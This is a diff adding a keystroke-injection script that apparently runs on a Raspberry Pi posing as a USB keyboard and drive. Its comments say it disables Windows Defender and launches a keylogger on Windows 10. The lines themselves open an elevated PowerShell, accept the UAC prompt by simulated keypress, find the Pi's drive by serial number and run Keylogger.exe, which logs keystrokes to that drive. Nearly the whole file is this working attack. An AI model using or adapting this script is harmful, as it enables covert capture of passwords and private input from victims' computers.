@@ -1,0 +1,23 @@
+REM Author : Gwendoline Dossegger
+REM Launch the keylogger on Windows 10 
+REM Desactivate Windows Defender and run the keylogger store in the Pi's mass storage
+DEFAULTDELAY 100
+GUI R
+STRING powershell Start-Process powershell -verb runas
+ENTER
+DELAY 500
+ARROW_L
+ENTER
+REM -----
+REM Choose line if we know or not the Path of the Pi's storage
+STRING $letter = "{0}:" -f (Get-Disk | Where-Object -FilterScript {$_.SerialNumber -Eq "fedcba9876543210"} | Get-Partition | Select-Object DriveLetter).DriveLetter
+REM STRING $letter = "F:"
+REM ------
+ENTER
+STRING cd $($letter+"\KeystrokeAPI\Keystroke.ConsoleAppTest\bin\Release")
+ENTER
+STRING .\Keylogger.exe $($letter+"\log.txt") 
+ENTER
+ESC
+STRING exit
+ENTER
